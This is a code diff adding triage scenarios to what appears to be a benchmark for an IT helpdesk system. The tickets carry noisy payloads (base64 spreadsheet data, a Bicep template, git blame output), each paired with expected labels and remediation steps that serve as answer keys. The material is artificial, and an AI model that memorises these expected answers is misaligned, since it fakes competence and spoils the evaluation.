+                "Ping 10.12.40.50 to confirm network reachability of the printer.",
+                "Check the switch port and VLAN configuration for the printer's network drop.",
+                "If the port is down, re-enable it and verify the printer obtains its IP via DHCP or static config.",
+                "Test printing from a workstation on Floor 12 after connectivity is restored.",
+            ],
+            reporter_name="Maria Santos",
+            reporter_email="maria.santos@contoso.com",
+            reporter_department="Client Services",
+            channel=Channel.EMAIL,
+            tags=["data-cleanup", "auto-reply-chain", "ooo-noise"],
+            difficulty="easy",
+        ),
+        # ── DC-233  Base64-encoded Excel binary data inlined ────────────────
+        ScenarioDefinition(
+            scenario_id="DC-233",
+            subject="Monthly fee reconciliation file corrupted \u2014 need data recovery",
+            description=(
+                "Hi Data Platform team,\n\n"
+                "The monthly fee reconciliation file got corrupted during upload to "
+                "the SFTP server. I'm pasting the raw base64 of the original .xlsx "
+                "file below so you can try to recover it:\n\n"
+                "UEsDBBQAAAAIAGFiV1kAAAAAAAAAAAAAABIAHABbQ29udGVudF9UeXBlc10u\n"
+                "eG1slc9NDoIwEAXgvYl3IN1aqQsXRuMBdC+hDFBT+kvn/t5WEBe68GfezJcv\n"
+                "M5ut63b9rN8dMRNJKBHgLDBVRN1aZOKY7tY7IXhBZMjJMxECt97dS8lVC4Z4\n"
+                "RQ4sT2riDYm/EBRCmAU/p+T9Xdc3T6ghHuCr96RYEFLyVkfI3Dlcp6HPg68R\n"
+                "DGqKuI+f9FQ1ZBK+VZA+rDLcMi+cgyvs6b33kHHD4QuxQHa/AGa4VbL5D2C4\n"
+                "h4dUcPIvPF/+oAxG0Ft3MmO4MjPdGQSdeMygRPHjHq+8RUzLjTgj2vQ/+4Xh\n"
+                "S/fxGFRhRIKOiNB5rCGVRs0Y9A7sZNwdvDYUm4rYBNO2TfYN4R3Mq1JGShYR\n"
+                "Q9mBxePjKZFnwzDz0IWeBDHJKpGEqR4+Kvy6NfFu4c7i3E5iPt6uf4BUEsDB\n"
+                "BQAAAAIAYGJXWQAAAAAAAAAAAAAAAA8AHABfcmVscy8ucmVsc2WPzQrCMBCE\n"
+                "7wXvEPZu0noQkab1IIKn0gcI7bYNtn/sRtG3N4igIHiZYb6ZYdL8PvbixqN3\n"
+                "[... truncated \u2014 full file is 847KB of base64 ...]\n\n"
+                "The file contains fee schedules for 12,000+ client accounts for "
+                "March 2026. The SFTP upload log shows the transfer was interrupted "
+                "at 68% completion.\n\n"
+                "SFTP server: sftp-prod-02.contoso.internal\n"
+                "Original file: /incoming/fees/2026-03-fee-recon.xlsx\n"
+                "Upload time: 2026-03-17 23:15 UTC\n"
+                "File size (expected): 634,218 bytes\n"
+                "File size (received): 431,268 bytes\n\n"
+                "\u2014 Owen Bradley\nFee Billing"
+            ),
+            category=Category.DATA_STORAGE,
+            priority=Priority.P2,
+            team=Team.DATA_PLATFORM,
+            needs_escalation=False,
+            missing_info=[MissingInfo.SCREENSHOT_OR_ATTACHMENT, MissingInfo.STEPS_TO_REPRODUCE],
+            next_best_action=(
+                "Recover the corrupted fee reconciliation file from the source system "
+                "and re-upload to sftp-prod-02 \u2014 the original transfer was interrupted at 68%."
+            ),
+            remediation_steps=[
+                "Check the source system for the original complete copy of 2026-03-fee-recon.xlsx.",
+                "Re-upload the complete file to sftp-prod-02.contoso.internal via a verified SFTP session.",
+                "Validate the uploaded file size matches the expected 634,218 bytes.",
+                "Run the fee reconciliation pipeline against the recovered file and verify output.",
+            ],
+            reporter_name="Owen Bradley",
+            reporter_email="owen.bradley@contoso.com",
+            reporter_department="Fee Billing",
+            channel=Channel.PORTAL,
+            tags=["data-cleanup", "base64-binary-inline", "corrupted-attachment"],
+            difficulty="medium",
+        ),
+        # ── DC-234  Terraform/Bicep IaC template pasted as description ──────
+        ScenarioDefinition(
+            scenario_id="DC-234",
+            subject="Azure VM provisioning failing in DR region \u2014 Bicep template errors",
+            description=(
+                "Hi Cloud Infra team,\n\n"
+                "Our DR failover VMs in East US 2 won't provision. Here's the Bicep "
+                "template we're deploying:\n\n"
+                "@description('DR environment virtual machines for trading platform')\n"
+                "param location string = 'eastus2'\n"
+                "param vmSize string = 'Standard_E16as_v5'\n"
+                "param adminUsername string = 'contosoadmin'\n"
+                "@secure()\n"
+                "param adminPassword string\n"
+                "param vnetResourceGroup string = 'rg-network-dr-eastus2'\n"
+                "param subnetName string = 'snet-trading-dr'\n\n"
+                "var vmNames = [\n"
+                "  'vm-trade-dr-01'\n"
+                "  'vm-trade-dr-02'\n"
+                "  'vm-trade-dr-03'\n"
+                "  'vm-trade-dr-04'\n"
+                "]\n\n"
+                "resource networkInterface 'Microsoft.Network/networkInterfaces@2023-09-01' = [for (vmName, i) in vmNames: {\n"
+                "  name: 'nic-$${vmName}'\n"
+                "  location: location\n"
+                "  properties: {\n"
+                "    ipConfigurations: [\n"
+                "      {\n"
+                "        name: 'ipconfig1'\n"
+                "        properties: {\n"
+                "          subnet: {\n"
+                "            id: resourceId(vnetResourceGroup, 'Microsoft.Network/virtualNetworks/subnets', 'vnet-dr-eastus2', subnetName)\n"
+                "          }\n"
+                "          privateIPAllocationMethod: 'Dynamic'\n"
+                "        }\n"
+                "      }\n"
+                "    ]\n"
+                "  }\n"
+                "}]\n\n"
+                "resource virtualMachine 'Microsoft.Compute/virtualMachines@2023-09-01' = [for (vmName, i) in vmNames: {\n"
+                "  name: vmName\n"
+                "  location: location\n"
+                "  properties: {\n"
+                "    hardwareProfile: { vmSize: vmSize }\n"
+                "    osProfile: {\n"
+                "      computerName: vmName\n"
+                "      adminUsername: adminUsername\n"
+                "      adminPassword: adminPassword\n"
+                "    }\n"
+                "    storageProfile: {\n"
+                "      imageReference: {\n"
+                "        publisher: 'MicrosoftWindowsServer'\n"
+                "        offer: 'WindowsServer'\n"
+                "        sku: '2022-datacenter-g2'\n"
+                "        version: 'latest'\n"
+                "      }\n"
+                "    }\n"
+                "    networkProfile: {\n"
+                "      networkInterfaces: [{ id: networkInterface[i].id }]\n"
+                "    }\n"
+                "  }\n"
+                "}]\n\n"
+                "Deployment error:\n"
+                "\"code\": \"InvalidTemplateDeployment\",\n"
+                "\"message\": \"The template deployment failed with error: "
+                "Subnet 'snet-trading-dr' not found in virtual network 'vnet-dr-eastus2' "
+                "in resource group 'rg-network-dr-eastus2'.\"\n\n"
+                "Correlation ID: 9f8e7d6c-5b4a-3210-fedc-ba9876543210\n\n"
+                "We need the DR VMs online before the quarterly DR test on Friday.\n\n"
+                "\u2014 Nadia Kowalski\nInfrastructure Engineering"
+            ),
+            category=Category.NETWORK,
+            priority=Priority.P2,
+            team=Team.NETWORK_OPS,
+            needs_escalation=False,
+            missing_info=[MissingInfo.CONFIGURATION_DETAILS, MissingInfo.ENVIRONMENT_DETAILS],
+            next_best_action=(
+                "Create the missing subnet 'snet-trading-dr' in vnet-dr-eastus2 "
+                "or correct the Bicep template to reference the correct subnet name."
+            ),
+            remediation_steps=[
+                "Verify whether subnet 'snet-trading-dr' exists in vnet-dr-eastus2 in rg-network-dr-eastus2.",
+                "If the subnet does not exist, create it with the appropriate address prefix.",
+                "If the subnet name is different, update the Bicep template parameter to match.",
+                "Re-deploy the Bicep template and verify all four DR VMs provision successfully.",
+            ],
+            reporter_name="Nadia Kowalski",
+            reporter_email="nadia.kowalski@contoso.com",
+            reporter_department="Infrastructure Engineering",
+            channel=Channel.PORTAL,
+            tags=["data-cleanup", "iac-template-dump", "bicep-noise"],
+            difficulty="hard",
+        ),
+        # ── DC-235  Git blame output pasted as ticket description ───────────
+        ScenarioDefinition(
+            scenario_id="DC-235",
+            subject="Bug in trade settlement calculation \u2014 rounding error on FX conversion",
+            description=(
+                "Hi team,\n\n"
+                "We found a rounding error in the FX settlement calculation. I ran "
+                "git blame on the offending file to find out when it was introduced. "
+                "Here's the output:\n\n"
+                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  1) import decimal\n"
+                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  2) from decimal import Decimal, ROUND_HALF_UP\n"
+                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  3) \n"
+                "e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500  4) FX_PRECISION = 4  # was 6\n"
+                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  5) \n"
+                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  6) def convert_settlement_amount(\n"
+                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  7)     amount: Decimal,\n"
+                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  8)     fx_rate: Decimal,\n"
+                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  9)     target_ccy: str,\n"
+                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400 10) ) -> Decimal:\n"
+                "c9d0e1f2 (Patel, Aisha    2026-01-20 11:00:00 -0500 11)     # HOTFIX: round to FX_PRECISION\n"
+                "c9d0e1f2 (Patel, Aisha    2026-01-20 11:00:00 -0500 12)     converted = amount * fx_rate\n"
+                "e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500 13)     rounded = converted.quantize(\n"
+                "e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500 14)         Decimal(10) ** -FX_PRECISION,\n"
+                "e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500 15)         rounding=ROUND_HALF_UP,\n"
+                "e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500 16)     )\n"
+                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400 17)     return rounded\n\n"
+                "The bug is on line 4 \u2014 commit e5f6a7b8 by Elena Volkov changed "
+                "FX_PRECISION from 6 to 4 on 2025-11-02. This causes a rounding "
+                "discrepancy of up to $0.01 per trade on JPY and KRW conversions, "
+                "which compounds to ~$14,000/month in settlement differences.\n\n"
+                "Service: trade-settlement-engine (repo: contoso/trade-settlement)\n"
+                "File: src/fx/conversion.py\n"
+                "Environment: prod (K8s namespace: prod-settlement)\n\n"
+                "\u2014 James O'Brien\nTrade Settlement"
+            ),
+            category=Category.SOFTWARE,
+            priority=Priority.P2,
+            team=Team.ENTERPRISE_APPS,
+            needs_escalation=True,
+            missing_info=[MissingInfo.BUSINESS_IMPACT, MissingInfo.REPRODUCTION_FREQUENCY],
+            next_best_action=(
+                "Revert FX_PRECISION from 4 back to 6 in src/fx/conversion.py and "
+                "deploy a hotfix to resolve the $14K/month settlement rounding discrepancy."
+            ),
+            remediation_steps=[
+                "Revert FX_PRECISION to 6 in src/fx/conversion.py (undo commit e5f6a7b8).",
+                "Add unit tests for JPY and KRW FX conversion rounding at 6-digit precision.",
+                "Deploy the fix to the prod-settlement namespace and verify settlement amounts.",
+                "Reconcile the accumulated rounding differences for the affected period.",
+            ],
+            reporter_name="James O'Brien",
+            reporter_email="james.obrien@contoso.com",
+            reporter_department="Trade Settlement",
+            channel=Channel.CHAT,
+            tags=["data-cleanup", "git-blame-output", "source-code-noise"],
+            difficulty="medium",
+        ),
     ]
+
